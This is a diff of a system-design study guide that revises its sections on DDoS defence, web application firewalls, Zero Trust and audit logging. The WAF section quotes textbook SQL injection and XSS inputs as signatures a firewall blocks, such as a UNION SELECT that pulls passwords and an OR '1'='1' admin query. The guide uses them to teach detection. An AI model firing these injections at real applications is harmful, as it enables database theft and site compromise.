-**Examples:** Redis cache · CDN cache · edge caching
+### Pitfalls and design tips
 
-**Benefits:**
+- **Autoscaling alone is not DDoS protection** — it becomes an expensive loss if attack traffic is not dropped at edge.
+- L7 attacks look like legitimate HTTP — need **behavioral bot detection**, not only IP blocklists.
+- Protect **origin IP** — if attackers bypass CDN and hit raw IP, defenses fail; firewall allow only CDN ranges.
+- SYN floods need **kernel/host tuning** (SYN cookies, `somaxconn`) in addition to cloud shields.
+- Rate limits on **login** and **password reset** prevent credential stuffing that doubles as app-layer DDoS.
+- Game-day: test failover and static fallback pages when dynamic tier is saturated.
+- Cost controls: alert on bandwidth anomalies; enable provider DDoS response runbooks (AWS Shield Advanced, Cloudflare Under Attack mode).
 
-- Reduces database hits
-- Improves response time
-- Absorbs repeated requests
+---
 
-### Backpressure mechanisms
+### Real-world example
 
-System slows down intake when overloaded.
-
-**Examples:** queue requests · reject excess traffic · return `429 Too Many Requests`
-
-### Global traffic scrubbing centers
-
-Specialized systems that:
-
-- Inspect traffic
-- Remove malicious packets
-- Forward clean traffic
-
-Used by cloud providers.
-
-### Cloud DDoS protection services
-
-**Examples:**
-
-- AWS Shield
-- Cloudflare DDoS Protection
-- Google Cloud Armor
-
-**Features:**
-
-- Real-time mitigation
-- Traffic analysis
-- Automated blocking
-
-### High-level defense architecture
-
-```text
-Internet traffic → CDN / edge → DDoS protection → WAF → load balancer → app servers → cache → database
-```
-
-### Defense principles
-
-- Absorb traffic at edge
-- Filter malicious requests early
-- Scale infrastructure dynamically
-- Limit request rates
-- Detect abnormal behavior
-- Fail gracefully under load
-
-### Summary
-
-```text
-DDoS = distributed flood overwhelms CPU, bandwidth, or app layer
-Layer defense: CDN/anycast edge, scrubbing, WAF, rate limits, autoscaling, caching
-Autoscaling absorbs load but does not stop attacks — filter and absorb at the edge first
-```
+**GitHub (2018) — 1.35 Tbps memcached amplification** hit Akamai-protected endpoints; traffic was absorbed at Akamai's scrubbing network while origin stayed reachable. Smaller teams use **Cloudflare proxied DNS** so HTTP traffic passes through bot management before reaching a single-region origin. **AWS Shield Standard** automatically mitigates common L3/L4 floods on Elastic IP and CloudFront; during an application-layer campaign on `/api`, operators enable WAF rate-based rules (e.g. block IPs exceeding 2000 req/5 min) and increase CloudFront caching on public JSON to shed database load.
 
 ---
 
 ## 10.19 WAF
 
-### What is WAF?
+### Overview
 
-A **Web Application Firewall (WAF)** is a security layer that filters, monitors, and blocks HTTP/HTTPS traffic between clients and web applications.
+A nightclub bouncer checks bags at the door against a list of banned items and suspicious behavior — patrons never reach the dance floor with weapons or if they are clearly bots storming the entrance. A **Web Application Firewall (WAF)** sits in front of your HTTP stack and inspects each request's URL, headers, and body before it hits application code.
 
-**Key idea:** it inspects web requests before they reach your app.
+Technically, a WAF is an inline or reverse-proxy filter for HTTP/HTTPS that applies signature rules, rate limits, geo policies, and behavioral scores to block OWASP Top 10 patterns (SQLi, XSS, path traversal) and abusive automation. It centralizes edge security without changing every microservice.
 
-### Why WAF is used
+---
 
-Web applications are exposed to:
+### What problem it fixes
 
-- SQL injection
-- XSS attacks
-- CSRF attempts
-- SSRF payloads
-- Bot traffic
-- DDoS at application layer
+Application code evolves faster than security reviews; one legacy endpoint with string-built SQL can compromise the whole database. WAF provides a **uniform inspection point** for malicious payloads and bots, logs attack attempts, and can challenge or throttle abusive IPs while teams patch root causes.
 
-WAF helps:
+---
 
-- Detect malicious patterns
-- Block suspicious requests
-- Protect application logic
+### What it does
 
-### Where WAF sits in architecture
+WAF deployment models:
 
-```text
-Internet traffic → WAF → load balancer → application servers → databases / services
-```
+| Type | Trade-off |
+|------|-----------|
+| **Cloud WAF** | AWS WAF + CloudFront/ALB, Cloudflare, Azure Front Door — managed, scalable |
+| **Network appliance** | Hardware reverse proxy — low latency, capital cost |
+| **Host-based** | ModSecurity on nginx — per-server tuning, ops burden |
 
-WAF acts as a reverse proxy or inline filter.
-
-### How WAF works
-
-**Request flow:**
+Detection approaches:
 
 ```text
-Client request → WAF intercepts → inspect headers/body/URL → match rules → allow/block/challenge → forward if safe
+Signature (negative):  block if body contains "' OR 1=1" or "<script>"
+Behavioral:            1000 POSTs/min to /login from one ASN → block
+Positive (allowlist):  only /api/v1/users, /health allowed — strict APIs
 ```
 
-### Types of WAF
+Common blocks: SQLi, XSS, RFI/LFI, path traversal (`../`), command injection, scanner user-agents.
 
-| Type | Description |
-|------|-------------|
-| **Network-based WAF** | Hardware appliance; high performance; low latency |
-| **Host-based WAF** | Installed on application server; highly customizable; higher resource usage |
-| **Cloud-based WAF** | Managed service; easy scaling; common in modern systems |
+---
 
-**Cloud examples:** AWS WAF · Cloudflare WAF · Azure WAF
+### How it works — the architecture inside
 
-### Rule-based filtering
-
-WAF uses predefined rules.
-
-**Block:** SQL injection patterns · script tags · suspicious payloads
-
-**Allow:** valid API requests · trusted IPs
-
-**Example rule:**
+**Request decision flow:**
 
 ```text
-IF request contains "' OR 1=1" THEN block
+Client → TLS terminate at edge → WAF inspect URL/query/body/headers
+  → rule groups (OWASP Core Rule Set, AWS Managed Rules) → match?
+    ALLOW → forward to LB → app
+    BLOCK → 403 + log
+    COUNT → log only (tuning mode)
+    CAPTCHA / challenge → bot verification
 ```
 
-### Signature-based detection
-
-WAF compares request patterns with known attack signatures.
-
-**Example signatures:**
-
-- `<script>`
-- `UNION SELECT`
-- `DROP TABLE`
-- `../` (path traversal)
-
-If match found → block request.
-
-### Behavior-based detection
-
-Instead of patterns, WAF analyzes behavior:
-
-- Too many requests
-- Unusual request paths
-- Bot-like activity
-- Repeated failures
-
-**Example:** 1000 login attempts/minute → block IP
-
-### Positive security model
-
-Allow only known good traffic.
-
-```text
-Only these endpoints allowed: /login, /signup, /products
-Everything else blocked
-```
-
-Safer but requires strict configuration.
-
-### Negative security model
-
-Block known bad patterns.
-
-```text
-Block: SQL injection patterns, XSS payloads
-Allow: everything else
-```
-
-More flexible but less strict.
-
-### Common attacks blocked by WAF
-
-- SQL injection
-- Cross-site scripting (XSS)
-- Remote file inclusion
-- Local file inclusion
-- Path traversal
-- Command injection
-- Bot attacks
-
-### WAF and SQL injection
-
-**Request:**
+**Example SQLi block:**
 
 ```http
-GET /user?id=1 OR 1=1
+GET /products?id=1 UNION SELECT password FROM users
 ```
+WAF matches `UNION SELECT` signature → request never reaches app.
 
-WAF detects `OR 1=1` pattern → block request before reaching database.
-
-### WAF and XSS
-
-**Request:**
+**Rate-based rule:**
 
 ```text
-<script>alert(1)</script>
+IF client IP > 100 requests in 60s to /api/login THEN block IP for 10 minutes
 ```
 
-WAF detects `<script>` tags → block or sanitize request.
-
-### Rate limiting in WAF
-
-WAF can enforce limits.
-
-```text
-Example: 100 requests/min per IP
-If exceeded → block, CAPTCHA challenge, or throttle response
+```mermaid
+flowchart LR
+    Client[Client request] --> Edge[CDN / edge TLS]
+    Edge --> WAF[WAF engine]
+    WAF --> Rules[Rule groups]
+    Rules --> Decision{Match?}
+    Decision -->|Block| Reject[403 + log]
+    Decision -->|Allow| LB[Load balancer]
+    LB --> App[Application]
+    WAF --> SIEM[Security logs]
 ```
 
-### Bot protection
+**False positives:** legitimate input like `"O'Reilly"` or search for `"SELECT * from menu"` can trigger naive rules — start in **count mode**, tune exclusions, use CRS paranoia level appropriate to risk.
 
-WAF detects bots using:
+**Performance:** edge WAF adds single-digit milliseconds; heavy body inspection on large uploads may need size limits and selective rule application on sensitive routes only.
 
-- Request frequency
-- Header anomalies
-- JavaScript challenges
-- CAPTCHA
+---
 
-**Example:** automated scraper → blocked
+### Pitfalls and design tips
 
-### Geo blocking
+- WAF **does not replace** parameterized queries, output encoding, or authz — it is compensating control for gaps and zero-days.
+- **False positives** break checkout and search — maintain per-route rule exceptions with narrow scope.
+- Log **blocked request IDs** and correlate with app logs during incident response.
+- Managed rule sets need **version updates** — stale CRS misses new exploit chains.
+- For JSON APIs, inspect `Content-Type` and parse body fields; regex on raw stream misses encoded payloads.
+- Combine with **bot management** (JavaScript challenge, device fingerprint) for L7 DDoS and scraping.
+- PCI-DSS often expects WAF or equivalent on public-facing cardholder environments — know compliance mapping.
 
-Block traffic based on location.
+---
 
-**Example:** block requests from specific countries or high-risk regions
+### Real-world example
 
-### Custom rules
-
-Organizations define rules like:
-
-```text
-IF IP not in whitelist AND endpoint = /admin THEN block
-```
-
-### WAF logging and monitoring
-
-WAF logs:
-
-- Allowed requests
-- Blocked requests
-- Attack patterns
-- IP reputation
-
-**Used for:** security audits · threat analysis · incident response
-
-### False positives challenge
-
-Sometimes WAF blocks valid traffic.
-
-**Example:** user input `"SELECT product"` mistaken as SQL injection → valid request blocked.
-
-Requires tuning.
-
-### Performance impact
-
-WAF adds overhead:
-
-- Request inspection
-- Rule matching
-- Logging
-
-**Mitigation:** edge deployment · optimized rule sets · caching decisions
-
-### High-level architecture
-
-```text
-Internet → CDN / edge WAF → WAF engine → load balancer → API gateway → microservices → databases
-```
-
-### WAF benefits
-
-- Protects against OWASP Top 10
-- Stops common web attacks
-- Adds security layer without code changes
-- Centralized security control
-- Real-time blocking
-
-### Summary
-
-```text
-WAF = HTTP/HTTPS filter between clients and app (reverse proxy / inline)
-Signature + behavior rules; positive (allowlist) vs negative (blocklist) models
-Tune for false positives; deploy at edge; complements app-level security, not a replacement
-```
+**AWS WAF on ALB:** A team attaches AWS Managed Rules `AWSManagedRulesSQLiRuleSet` and `AWSManagedRulesKnownBadInputsRuleSet` to an Application Load Balancer. A scanner hits `/admin?id=1' OR '1'='1` — WAF returns 403, CloudWatch metric `BlockedRequests` spikes, SNS alerts SecOps. During rollout, search endpoint queries containing the word "union" (wine **union** listings) triggered false positives; they add a **scope-down statement** excluding `/api/search` from the SQLi rule group while keeping parameterized queries in application code. Cloudflare's OWASP Core Ruleset offers similar managed protection with one-click "Under Attack" mode during active campaigns.
 
 ---
 
 ## 10.20 Zero Trust Security
 
-### What is Zero Trust?
+### Overview
 
-**Zero Trust** is a security model where no user, device, or network is trusted by default — even if they are inside the system perimeter.
+Old office security assumed: once you badge through the lobby, every corridor is yours. Zero Trust assumes the building may already have an intruder — every door, every time, checks who you are, what you need, and whether your laptop is healthy before opening.
 
-**Key idea:** never trust, always verify.
+**Zero Trust** is a security model where no user, device, or network location receives implicit trust. Every access request is authenticated, authorized, and continuously evaluated against policy using identity, device posture, and context — regardless of whether the caller is "inside" the corporate VPN or the public cloud.
 
-### Why Zero Trust?
+---
 
-**Traditional model:**
+### What problem it fixes
 
-```text
-Inside network = trusted
-Outside network = untrusted
-```
+Perimeter firewalls collapse in cloud and remote-work reality: VPN users get broad lateral movement; compromised laptops on "trusted" Wi-Fi reach internal admin panels; microservices talk over flat networks. A single breach becomes domain-wide because **inside meant trusted**. Zero Trust shrinks blast radius by verifying each hop and granting least privilege.
 
-**Problem:** if attacker enters internal network, they get broad access.
+---
 
-**Zero Trust model** — every request is verified:
+### What it does
 
-- Who is requesting?
-- What is being accessed?
-- Is the device safe?
-- Is the context valid?
+Core principles map to concrete mechanisms:
 
-### Core principles
+| Principle | Implementation |
+|-----------|----------------|
+| **Never trust, always verify** | MFA, short-lived tokens, per-request authZ |
+| **Least privilege** | RBAC/ABAC scopes; service accounts per workload |
+| **Assume breach** | Micro-segmentation, honeypots, continuous monitoring |
+| **Identity as perimeter** | SSO + IdP signals (device, location, risk score) |
 
-**1. Never trust**
-
-No implicit trust for:
-
-- Internal users
-- Internal networks
-- Services
-- Devices
-
-**2. Always verify**
-
-Every request is authenticated and authorized.
-
-**3. Least privilege access**
-
-Users and services get only minimum access needed.
-
-**4. Assume breach**
-
-System assumes attacker may already be inside.
-
-### Zero Trust architecture
+Architecture components:
 
 ```text
-User/device → continuous authentication → policy engine → access decision → application/service
+Policy Engine (PDP)  — decides ALLOW / DENY / STEP-UP MFA
+Policy Enforcement Point (PEP) — API gateway, service mesh sidecar enforces decision
+Policy Administration Point — defines roles, policies
 ```
 
-### Traditional vs Zero Trust
+---
 
-**Traditional:**
+### How it works — the architecture inside
+
+**Traditional vs Zero Trust:**
 
 ```text
-Internet → firewall → internal network → apps
-Assumption: inside = safe
+Traditional:  Internet → firewall → flat internal network → any app
+Zero Trust:   User/device → IdP (MFA) → policy engine → PEP at each API/mesh hop → service
+              Service A → mTLS + JWT → Service B verifies identity + scope before work
 ```
 
-**Zero Trust:**
+**Micro-segmentation:**
 
 ```text
-Every request → verified individually
-No implicit trust anywhere
+Payment VPC ← deny → Analytics VPC
+Order service SA may call Inventory gRPC only with "inventory.read" scope
+East-west traffic default deny; allow by explicit policy
 ```
 
-### Identity-centric security
-
-Identity becomes the new perimeter.
-
-**Signals used:**
-
-- User identity
-- Device identity
-- Location
-- Behavior
-- Risk score
-
-**Example:** same user login from new device → extra verification
-
-### Strong authentication
-
-Zero Trust requires:
-
-- Multi-factor authentication (MFA)
-- Single sign-on (SSO)
-- Short-lived tokens
-- Continuous re-authentication
-
-### Micro-segmentation
-
-Network is divided into small zones.
+**Continuous verification signals:**
 
 ```text
-Zone 1: payment services
-Zone 2: user services
-Zone 3: analytics
+User login from new country + jailbroken device + 3 AM → risk score high → require MFA or deny
+Session token TTL 15 min; refresh requires re-validation
+Device cert expired → block corporate app access
 ```
 
-Access between zones is strictly controlled.
-
-### Least privilege access (example)
-
-```text
-User service
-  Can access:    user DB
-  Cannot access: payment DB
+```mermaid
+flowchart LR
+    User[User / device] --> IdP[Identity provider]
+    IdP --> Policy[Policy engine]
+    Policy --> PEP[PEP API gateway]
+    PEP --> SvcA[Service A]
+    SvcA --> mTLS[mTLS + token]
+    mTLS --> SvcB[Service B]
+    PEP --> Audit[Audit / SIEM]
 ```
 
-Even inside the same system.
+**Microservices:** **mTLS** (SPIFFE/SPIRE, Istio) proves workload identity; **JWT with scopes** limits what each token can call. Secrets fetched per request from vault with short TTL — never long-lived shared passwords between services.
 
-### Continuous verification
+**Context-aware access:** time, geo, IP reputation, and behavior feed the policy engine — same user, different decision on corp laptop vs unknown mobile.
 
-Access is not one-time. System continuously checks:
+---
 
-- Session validity
-- Token expiry
-- Device health
-- Behavior anomalies
+### Pitfalls and design tips
 
-### Device trust
+- Zero Trust is a **program**, not a product checkbox — needs IdP hygiene, asset inventory, and policy lifecycle.
+- **Performance overhead** from per-request authZ and mTLS — cache decisions with short TTL where safe.
+- Legacy apps that assume flat network need **wrappers** (sidecar PEP) rather than big-bang rewrites.
+- Overly aggressive step-up MFA hurts UX — tune risk-based policies with real login telemetry.
+- **Service accounts** multiply — automate rotation and disable unused principals; otherwise Zero Trust becomes credential sprawl.
+- Google **BeyondCorp** and Microsoft **Zero Trust** reference architectures are the interview anchors — identity-centric, no corporate VPN required.
+- Pair with **audit logging** (10.21) — policy denials and anomalous east-west traffic must be visible.
 
-Each device is evaluated:
+---
 
-- Is device encrypted?
-- Is OS updated?
-- Is it jailbroken/rooted?
-- Is antivirus active?
+### Real-world example
 
-Untrusted devices may be blocked.
-
-### Policy engine
-
-Central component that decides access.
-
-**Inputs:** identity · device info · context · resource requested
-
-**Output:** ALLOW · DENY · CHALLENGE
-
-### Policy enforcement point (PEP)
-
-Component that enforces decisions.
-
-**Example:** API gateway acts as PEP — blocks or allows requests.
-
-### Context-aware access
-
-Access decisions consider:
-
-- Time of request
-- Location
-- IP reputation
-- Device type
-- User behavior patterns
-
-**Example:** login from unusual country → deny or MFA
-
-### Zero Trust in microservices
-
-```text
-Service A → authenticate to Service B → B verifies identity + permissions → access granted or denied
-```
-
-**Tech used:** mTLS · service identity tokens · JWT with scopes
-
-### API security in Zero Trust
-
-Every API request must include:
-
-- Authentication token
-- Authorization scope
-- Valid signature
-
-API gateway enforces:
-
-- Rate limiting
-- Identity validation
-- Policy checks
-
-### Zero Trust with KMS and secrets
-
-Secrets are never exposed broadly.
-
-```text
-Application → secret manager / KMS → short-lived credential issued → access resource
-```
-
-### Logging and monitoring
-
-Everything is logged:
-
-- Login attempts
-- API calls
-- Policy decisions
-- Failed access attempts
-
-**Used for:** threat detection · auditing · incident response
-
-### Benefits of Zero Trust
-
-- Reduces insider threat risk
-- Limits attack blast radius
-- Strong identity-based security
-- Better cloud security model
-- Works well in distributed systems
-
-### Challenges
-
-- Complex implementation
-- Performance overhead
-- Requires strong identity infrastructure
-- Continuous policy tuning
-
-### High-level architecture
-
-```text
-User/device → identity provider (auth) → policy engine → PEP (API gateway) → microservices → data layer — verified and monitored at each step
-```
-
-### Summary
-
-```text
-Zero Trust = no implicit trust; verify every request (identity, device, context)
-Use MFA, micro-segmentation, least privilege, mTLS, policy engine + PEP (e.g. API gateway)
-Assume breach; continuous verification and audit logging throughout
-```
+**Google BeyondCorp:** Employees access internal tools over the public internet without a traditional VPN. Device inventory and certificate establish device trust; access proxy checks user + device + app policy on every request. A contractor laptop failing patch compliance receives deny on source code hosts even on office Wi-Fi. In Kubernetes, **Istio** with **SPIFFE IDs** enforces mTLS between `payments` and `ledger` namespaces — `ledger` rejects connections from `marketing` pods at the mesh layer before application code runs, embodying micro-segmentation without manual firewall tickets per service pair.
 
 ---
 
 ## 10.21 Audit Logging
 
-### What is audit logging?
+### Overview
 
-**Audit logging** is the process of recording detailed, immutable records of system events to track who did what, when, where, and how.
+A building's security camera tape answers after an incident: who entered the server room, when, with whose badge, and whether the door alarm fired. **Audit logging** is the tamper-evident record of security-relevant actions in software — not debug stack traces, but who changed what, from where, and whether it succeeded.
 
-**Key idea:** every critical action in the system is recorded for traceability and accountability.
+Technically, audit logging captures structured, append-only events for authentication, authorization decisions, data mutations, configuration changes, and secret operations. Logs flow to centralized storage and SIEM tools for compliance, forensics, and real-time alerting.
 
-### Why audit logging?
+---
 
-Audit logs help in:
+### What problem it fixes
 
-- Security investigations
-- Compliance requirements
-- Debugging production issues
-- Detecting suspicious activity
-- Forensic analysis after incidents
+Without audit trails you cannot reconstruct breaches ("which API key leaked data?"), prove compliance (PCI, HIPAA, SOC 2), or detect insider abuse. Application debug logs are noisy, mutable, and lack consistent identity fields. Audit logging fixes **accountability** and **non-repudiation** for sensitive operations.
 
-### What is logged in audit logs?
+---
 
-Typical audit log entry includes:
+### What it does
 
-- Who performed the action (user/service)
-- What action was performed
-- When it happened (timestamp)
-- Where it happened (IP/device)
-- Outcome (success/failure)
-- Resource affected
+A complete audit entry answers:
 
-### Example audit log entry
+```text
+WHO   — userId, service principal, API key id
+WHAT  — action (LOGIN, UPDATE_PROFILE, DELETE_RECORD, SECRET_READ)
+WHEN  — ISO 8601 timestamp (UTC)
+WHERE — source IP, device, geo, request id
+OUTCOME — SUCCESS / FAILURE / DENIED
+RESOURCE — entity type, id, before/after for changes
+```
 
-**User login:**
+Distinct from application logs:
+
+| | Application log | Audit log |
+|---|-----------------|-----------|
+| **Purpose** | Debug, performance | Security, compliance, accountability |
+| **Audience** | Engineers on-call | SecOps, auditors, legal |
+| **Mutability** | Often rotatable | Append-only, long retention |
+| **Content** | Stack traces, timings | Who did what to which record |
+
+Event categories: authentication, authorization, data CRUD on regulated fields, admin/config changes, key rotation, permission grants.
+
+---
+
+### How it works — the architecture inside
+
+**Pipeline:**
+
+```text
+User action → app handler → audit middleware emits structured JSON
+  → async queue (Kafka, Pub/Sub) → central store (S3 + Glacier, Elasticsearch, Splunk)
+  → SIEM rules → alerts (impossible travel, mass delete, after-hours admin)
+```
+
+**Example entries:**
 
 ```json
 {
   "userId": "u123",
   "action": "LOGIN",
   "status": "SUCCESS",
-  "ip": "192.168.1.10",
+  "ip": "203.0.113.10",
   "timestamp": "2026-06-26T10:15:00Z",
-  "device": "Chrome - Windows"
+  "device": "Chrome/Windows"
 }
 ```
-
-**Database update:**
 
 ```json
 {
   "userId": "u123",
   "action": "UPDATE_PROFILE",
+  "resource": "user:u123",
   "field": "email",
   "oldValue": "old@mail.com",
   "newValue": "new@mail.com",
   "status": "SUCCESS",
-  "timestamp": "2026-06-26T10:20:00Z"
+  "timestamp": "2026-06-26T10:20:00Z",
+  "requestId": "req-9f2a"
 }
 ```
 
-### Audit log vs application log
+**Immutability:** WORM storage, object locking, hash chaining, or write-once indices — attackers who gain app access should not erase evidence.
 
-| | Application logs | Audit logs |
-|---|------------------|------------|
-| **Purpose** | Debugging system behavior | User actions, security-sensitive operations |
-| **Content** | Technical errors, performance | Compliance tracking |
-| **Focus** | What system did | Who did what |
+**Distributed services:** each microservice publishes to a shared audit stream with consistent schema (`actor`, `action`, `target`, `result`) rather than siloed files on disk.
 
-### Types of audit events
-
-**Authentication events:** login · logout · failed login attempts
-
-**Authorization events:** access granted · access denied
-
-**Data events:** create record · update record · delete record
-
-**System events:** configuration changes · key rotation · permission updates
-
-### Audit log flow
-
-```text
-User action → application → audit logging layer → audit log store → monitoring / SIEM
+```mermaid
+flowchart LR
+    SvcA[Service A] --> Queue[Kafka / PubSub]
+    SvcB[Service B] --> Queue
+    SvcC[Service C] --> Queue
+    Queue --> Store[Central audit store]
+    Store --> SIEM[SIEM / Splunk]
+    SIEM --> Alert[Alerts + dashboards]
 ```
 
-### Audit log storage
+**Retention:** align with regulation — 30 days minimum for ops, 1 year common, 5–7 years for finance/health records. Legal hold may override TTL.
 
-Audit logs are stored in:
-
-- Append-only databases
-- Log stores (ELK, Splunk)
-- Data lakes
-- Cloud logging services
-
-**Important:** logs should not be easily editable.
-
-### Immutability of audit logs
-
-Audit logs must be:
-
-- Append-only
-- Tamper-resistant
-- Version-controlled or WORM storage
-
-**Why?** to prevent attackers from hiding traces.
-
-### Centralized audit logging
-
-Instead of storing logs per service:
-
-```text
-All services → central audit system
-```
-
-**Benefits:** easier monitoring · unified visibility · faster investigations
-
-### Distributed system audit logging
-
-**Microservices setup:**
-
-```text
-Service A → audit stream · Service B → audit stream · Service C → audit stream → central log platform
-```
-
-### Structured logging
-
-Audit logs should be structured.
-
-**Bad:**
-
-```text
-User updated profile
-```
-
-**Good:**
-
-```json
-{
-  "userId": "u1",
-  "action": "PROFILE_UPDATE",
-  "field": "phone"
-}
-```
-
-**Benefits:** easier querying · better analytics · machine-readable logs
-
-### Real-time audit logging
-
-Logs are streamed in real time to:
-
-- SIEM systems
-- Alerting systems
-- Dashboards
-
-**Used for:** fraud detection · attack detection · live monitoring
-
-### Audit log retention
-
-Logs must be stored for a defined period:
-
-- 30 days (basic systems)
-- 1 year (typical systems)
-- 5+ years (regulated industries)
-
-Depends on compliance requirements.
-
-### Security of audit logs
-
-Audit logs must be protected:
-
-- Encryption at rest
-- Encryption in transit (TLS)
-- Restricted access
-- Role-based access control
-
-### Access control for logs
-
-Only authorized roles can access logs:
-
-- Security team
-- Admins
-- Compliance officers
-
-Users cannot modify logs.
-
-### Audit log pipeline
-
-```text
-Application → log collector → stream (Kafka/queue) → log storage → SIEM / dashboard
-```
-
-### Use in incident response
-
-During security incidents, audit logs help answer:
-
-- What happened?
-- Who did it?
-- When did it happen?
-- How did attacker enter?
-
-### Compliance use cases
-
-Audit logging supports:
-
-- GDPR compliance
-- PCI-DSS (payments)
-- HIPAA (healthcare)
-- SOC2 requirements
-
-### High-level architecture
-
-```text
-User/service → application → audit middleware → event queue (Kafka/PubSub) → central audit store → SIEM / monitoring → alerting
-```
-
-### Key principles
-
-- Always log sensitive actions
-- Keep logs immutable
-- Centralize log collection
-- Ensure structured format
-- Secure access to logs
-- Enable real-time monitoring
-
-### Summary
-
-```text
-Audit logging = immutable, structured records of who did what, when, where
-Separate from app logs; centralize via queue → store → SIEM
-Protect with encryption, RBAC, append-only storage; retain per compliance needs
-```
+**Access control:** only security/compliance roles read audit indices; separate from application log viewers. Encrypt at rest and in transit.
 
 ---
+
+### Pitfalls and design tips
+
+- **Unstructured strings** ("user updated profile") are unqueryable — enforce JSON schema with required fields.
+- Do not log **secrets, passwords, or full PAN** — log that a change occurred, not the new password.
+- Clock skew across hosts breaks timelines — use **NTP** and include monotonic `requestId` for correlation.
+- High-volume read endpoints can **flood audit store** — audit writes and security events, not every GET.
+- Tamper resistance fails if attackers gain **SIEM admin** — separate account hierarchy and MFA on log platform.
+- Test **restore and search** during drills; archived Glacier tiers have retrieval latency unfit for live incident hour one.
+- Map events to compliance controls (SOC 2 CC7.2, PCI 10.2) early — retroactive schema changes are painful.
+
+---
+
+### Real-world example
+
+**SOC 2 Type II audit:** A fintech runs all admin actions through an API that emits audit events to **Kafka** topic `audit.events`, consumed into **Elasticsearch** with index lifecycle management (hot 30 days, warm 1 year). When an analyst investigates a suspicious wire transfer, they query `action:TRANSFER AND userId:u456 AND timestamp:[...]` and correlate with **CloudTrail** `GetSecretValue` on the same `requestId` propagated through headers. Failed login spikes trigger a **Splunk** alert to PagerDuty within five minutes. Auditors sample proof that DELETE on `customer_pii` always produces an immutable record with actor and outcome — satisfying traceability requirements without giving auditors raw production DB access.
+
+
+[<- Back to master index](../README.md)
